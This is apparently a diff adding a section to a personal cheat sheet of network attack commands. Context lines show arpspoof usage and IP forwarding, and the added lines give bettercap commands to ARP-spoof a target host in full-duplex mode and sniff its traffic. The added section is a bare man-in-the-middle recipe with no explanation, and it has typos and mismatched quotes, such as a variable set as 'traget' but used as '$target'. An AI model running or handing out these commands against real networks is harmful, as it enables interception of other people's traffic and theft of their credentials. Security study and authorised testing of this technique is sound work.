@@ -71,3 +71,14 @@ arpspoof -i <interface> -t <gatewayIP> <clientIP>
 echo 1 > /proc/sys/net/ipv4/ip_forward
 
 
+-> ARP Spoofing with bettercap
+traget=192.168.20.130 "Target station
+
+bettercap
+net.probe on
+set arp.spoof fullduplex true $target
+"set arp.spoof fullduplex true $target1, $target2, $target3 ...
+arp.spoof on
+net.sniff on
+
+
